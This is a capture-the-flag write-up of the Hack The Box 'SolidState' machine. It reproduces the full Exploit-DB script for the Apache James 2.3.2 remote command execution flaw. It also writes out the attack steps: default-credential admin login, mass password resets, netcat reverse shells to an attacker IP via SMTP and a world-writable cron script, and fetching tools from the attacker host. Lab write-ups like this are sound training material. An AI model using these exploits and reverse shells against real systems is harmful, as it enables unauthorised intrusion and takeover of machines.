# SolidState Writeup w/o Metasploit

![](https://miro.medium.com/max/583/1*MeYitTUrBqsreYhVAiEXJw.png)

## Reconnaissance <a id="1fb7"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.51
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 5 ports are open:

* **Port 22:** running OpenSSH 7.4p1
* **Port 25:** running JAMES smtpd 2.3.2
* **Port 80:** running httpd 2.4.25
* **Port 110:** running JAMES pop3d 2.3.2
* **Port 119:** running JAMES nntpd

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 17:22 EST
Nmap scan report for 10.10.10.51
Host is up (0.039s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/29%OT=22%CT=1%CU=39873%PV=Y%DS=2%DC=I%G=Y%TM=5E0927
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST
OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)                                                                                                                                                                        
                                                                                                                                                                               
Network Distance: 2 hops                                                                                                                                                       
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                      
                                                                                                                                                                               
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                          
Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.51
```

We get back the following result showing that one other port is open.

* **Port 4555:** running JAMES Remote Admin 2.3.2

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 17:26 EST
Nmap scan report for 10.10.10.51
Host is up (0.052s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.55 seconds
```

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.51
```

I managed to root the box and write this blog while the UDP scan did not terminate. So I don’t have UDP nmap scan results for this box.

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.
* Ports 25, 110, 119 and 4555 are running Apache James. Apache James is an open source SMTP and POP3 mail transfer agent and NNTP news server. Port 4555 immediately catches my eye since it’s a remote administration tool. We’ll need to run searchsploit on it to check if it is associated with any critical vulnerabilities.

## Enumeration <a id="c873"></a>

I always start off with enumerating HTTP first.

**Port 80**

Visit the application in the browser.

![](https://miro.medium.com/max/1203/1*ffkgnmV24ovMSS_Meno7uQ.png)

I visited all the pages in the application and didn’t find anything useful. Next, let’s run gobuster.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51
```

* **dir:** uses directory/file brute forcing mode
* **-w:** path to the wordlist
* **-u:** target URL or domain

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.51
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/29 17:31:19 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2019/12/29 17:56:46 Finished
===============================================================
```

Nothing useful, so let’s move on to enumerating port 4555.

**Port 4555**

Run searchsploit on the software name and version.

```text
searchsploit Apache James Server 2.3.2
```

We get back the following result.

![](https://miro.medium.com/max/1412/1*x4f2NY7NAqbl--nPVfjvcA.png)

Jackpot! Transfer the exploit to our current directory.

```text
searchsploit -m 35513
```

You should never run scripts that you haven’t reviewed first, so let’s view the content of this exploit.

```text
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```

After reviewing the script, I made a few notes:

1. This is an authenticated exploit, so we need credentials. The exploit uses the default credentials root/root that are probably shipped with the software. We’ll have to connect to the server to find out if these credentials are valid before we run this exploit.
2. When running the exploit we have to pass the IP address as an argument. The script by default connects to port 4555 which is good since our server is running on that port.
3. The script first creates a user with username “../../../../../../../../etc/bash\_completion.d” and password “exploit”. It then connects to the SMTP server and sends that user a payload. Right off the bat, this doesn’t make much sense, so we’ll have to research the vulnerability.

After a bit of research we find that the vulnerability is in the _adduser_ functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we’re creating a user with the username “../../../../../../../../etc/bash\_completion.d”, any mail that gets sent to that user will be stored in that directory path. Why is that dangerous? Long story short, anything under the directory /etc/bash\_completion.d is automatically loaded by Bash for all users! To learn more about bash completion scripts, refer to this [article](https://iridakos.com/programming/2018/03/01/bash-programmable-completion-tutorial).

Therefore, if we create a user with a username that leads to the /etc/bash\_completion.d directory, when we send an email to that user, our email gets saved in the bash\_completion.d directory and the content of our email is automatically loaded by Bash when any user logs into the machine. So if we include a reverse shell in the email, all we have to do is wait for a single user to log in and we have access to the machine!

Now that we’ve done our research, we’re ready to move on to the exploitation phase.

## Initial Foothold <a id="16ff"></a>

First, let’s test the root/root credentials on the James Remote Admin server.

```text
root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

It works, good! List the available commands using the HELP command.

```text
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Use the listusers command to display existing accounts.

```text
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We have 5 accounts. Since this is an admin account, we can set a user’s password and then access their account. If this was a real penetration test, you probably don’t want to do that. You’ll raise a lot of red flags when a bunch of users no longer can access their accounts. However, since this is a practice environment, I’m going to go all out. Let’s start by changing the mailadmin user’s account.

```text
setpassword mailadmin password
Password for mailadmin reset
```

Now that we reset the password for the mailadmin account, let’s access his email using telnet.

```text
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mailadmin
+OK
PASS password
+OK Welcome mailadmin
LIST
+OK 0 0
.
```

He does not have any mail. Next, I’m going to reset the passwords of all the other accounts.

```text
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
```

James, Thomas and John didn’t have any emails too. Mindy on the other hand had two emails stored in her account.

```text
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: WelcomeDear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.We are looking forward to you joining our team and your success at Solid State Security.Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your AccessDear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.username: mindy
pass: P@55W0rd1!2@Respectfully,
James
```

The first email was useless but the second email gives us SSH credentials! Let’s SSH into Mindy’s account.

```text
root@kali:~# ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

We’re in! However, we seem to be in a restricted bash shell \(rbash\). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. That’s why the “whoami” command didn’t work for us.

The “ls” and “cat” commands work, so we can at least view the user.txt flag.

![](https://miro.medium.com/max/597/1*nLY63rKrGS5cSJYalIg0rg.png)

There are several things you can do to try and break out of a restricted shell. I tried a bunch of them, but nothing worked. I’m not even allowed to change directories!

```text
mindy@solidstate:~$ cd /home
-rbash: cd: restricted
```

We seem to have reached a dead end, so let’s go back to the RCE exploit we found earlier. I’m going to exploit this manually instead of using the script on exploitdb.

Log back into the James Remote Admin server and create a user with the username “../../../../../../../../etc/bash\_completion.d” and password “password”.

```text
root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d password
User ../../../../../../../../etc/bash_completion.d added
```

Now let’s send this user an email that contains a reverse shell.

```text
root@kali:~# telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
EHLO bla.bla
250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: <'random@random.com>
250 2.1.0 Sender <'random@random.com> OK
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: bla.bla
'
/bin/nc -e /bin/bash 10.10.14.12 1234
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
```

If you’re not familiar with using telnet for SMTP communication, refer to this [guide](https://docs.microsoft.com/en-us/exchange/mail-flow/test-smtp-with-telnet?view=exchserver-2019). One thing to note is the single quote we added in the MAIL FROM field and after the FROM field. This is so that the file is interpreted properly at the backend and our reverse shell runs.

Next, set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Then SSH into Mindy’s account so that the content of the bash\_completion directory is loaded.

```text
ssh mindy@10.10.10.51
```

We get a shell that’s no longer restricted by the rbash shell!

![](https://miro.medium.com/max/759/1*-g9cs4Y3RIcMG88e3yREnQ.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Now we need to escalate privileges.

## Privilege Escalation <a id="866e"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We don’t get anything useful. Next, let’s try pspy. If you don’t have the script, you can download it from the following github repository.

```text
https://github.com/DominicBreuker/pspy
```

We know that the system is a 32 bit system so make sure you run pspy32. Upload it and run it on the attack machine in the same way we did for LinEnum.

After a minute we see an interesting process pop up.

![](https://miro.medium.com/max/943/1*Xz8gUedVbeUPuZEP-wmVHg.png)

If you view the permissions on the /opt/tmp.py file, you’ll see that everyone has read/write/execute privileges on it.

![](https://miro.medium.com/max/961/1*DIhulL7pCEZPfrsVwUe24w.png)

Therefore all we need to do is change the content of the file to send a reverse shell to our attack machine and then we simply wait for the cron job to send a privileged shell back.

Change the content of the file to send a reverse shell to our attack machine.

```text
echo "os.system('/bin/nc -e /bin/bash 10.10.14.12 7777')" >> /opt/tmp.py
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 7777
```

Wait a minute for the cron job to run.

![](https://miro.medium.com/max/808/1*ynxb5W6Wt8xB3sPlZDYZRg.png)

We have a shell! Grab the root.txt flag.

![](https://miro.medium.com/max/672/1*YCIcKSYTe77zalgSqIfAag.png)

## Lessons Learned <a id="f59a"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.
2. Information disclosure. SSH credentials are stored in plaintext in one of the user’s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login.
3. A Remote Code Execution \(RCE\) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software.

To escalate privileges we exploited one vulnerability.

1. A security misconfiguration of file permissions. There was a scheduled task that ran a file with root privileges although everyone had write access to that file. This allowed us to change the content of the file and get a privileged reverse shell sent back to our attack machine. To avoid this vulnerability, the file permissions should have been restricted to only root level access.

